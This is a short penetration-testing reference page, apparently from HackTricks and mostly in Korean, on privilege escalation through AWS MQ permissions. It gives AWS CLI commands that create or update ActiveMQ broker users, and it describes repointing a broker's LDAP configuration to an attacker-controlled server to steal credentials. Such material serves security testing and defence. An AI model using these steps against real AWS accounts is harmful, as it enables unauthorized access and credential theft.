# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

For more information about MQ check:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

해당 권한으로 **ActimeMQ 브로커에 새 사용자를 생성할 수 있습니다** (이는 RabbitMQ에서는 작동하지 않습니다):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**잠재적 영향:** ActiveMQ를 탐색하여 민감한 정보에 접근

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

해당 권한이 있으면 **ActimeMQ 브로커에 새 사용자를 생성할 수 있습니다** (이는 RabbitMQ에서는 작동하지 않습니다):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**잠재적 영향:** ActiveMQ를 통해 탐색하여 민감한 정보에 접근

### `mq:ListBrokers`, `mq:UpdateBroker`

브로커가 **LDAP**을 사용하여 **ActiveMQ**에서 권한 부여를 수행하는 경우, LDAP 서버의 **구성**을 **attacker가 제어하는 서버로** **변경**할 수 있습니다. 이렇게 하면 attacker는 **LDAP을 통해 전송되는 모든 credentials을 탈취**할 수 있습니다.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
ActiveMQ에서 사용된 원래 credentials를 어떻게든 찾아낼 수 있다면 MitM을 수행하여 creds를 훔치고, 원래 서버에서 이를 사용해 응답을 전송할 수 있습니다(혹은 훔친 credentials를 재사용하는 것만으로도 가능할 수 있습니다).

**잠재적 영향:** Steal ActiveMQ credentials

{{#include ../../../../banners/hacktricks-training.md}}
